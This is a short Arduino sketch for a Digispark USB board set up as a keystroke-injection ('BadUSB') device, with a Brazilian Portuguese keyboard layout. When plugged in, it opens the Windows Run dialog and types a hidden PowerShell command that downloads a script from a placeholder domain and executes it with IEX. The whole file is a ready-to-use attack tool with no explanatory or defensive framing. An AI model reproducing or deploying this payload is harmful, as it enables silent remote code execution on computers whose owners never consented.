#include "DigiKeyboard.h"
#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(900);
  DigiKeyboardPtBr.print("powershell -WindowStyle Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://seudominio/payload.ps1')"); //
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

for(;;) { }
}